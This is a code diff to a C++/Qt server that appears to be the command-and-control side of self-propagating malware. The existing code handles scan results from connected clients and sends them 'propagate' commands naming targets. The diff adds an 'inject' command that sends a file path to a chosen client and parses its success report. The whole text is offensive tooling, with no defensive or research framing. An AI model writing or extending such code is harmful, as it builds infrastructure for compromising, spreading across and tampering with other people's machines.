@@ -223,6 +223,13 @@ void Server::processPacketBuffer(ClientContext& client) {
             emit scanResultReceived(
                 QString::fromStdString(client.socket.getIp()),
                 QString::fromStdString(payload_str));
+        } else if (opcode == static_cast<uint16_t>(Opcode::INJECT_RES)) {
+            // Payload: path||capability|success(0/1)
+            bool success = !payload_str.empty() && payload_str.back() == '1';
+            QStringList parts = QString::fromStdString(payload_str).split('|');
+            QString path = parts.size() >= 1 ? parts[0] : QString();
+            emit injectResultReceived(
+                QString::fromStdString(client.socket.getIp()), success, path);
         }
 
         // Remove processed bytes from the buffer (wire size, not decrypted size)
@@ -268,6 +275,17 @@ void Server::sendPropagationCommand(const QString& ip, uint8_t cmd, const QStrin
             payload.push_back(static_cast<char>(cmd));
             payload.append(target.toStdString());
             Packet p(static_cast<uint16_t>(Opcode::PROPAGATE), payload);
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::sendInjectCommand(const QString& ip, const QString& targetPath) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            std::string payload = targetPath.toStdString();
+            Packet p(static_cast<uint16_t>(Opcode::INJECT), payload);
             client.socket.sendData(p.serialize());
             break;
         }
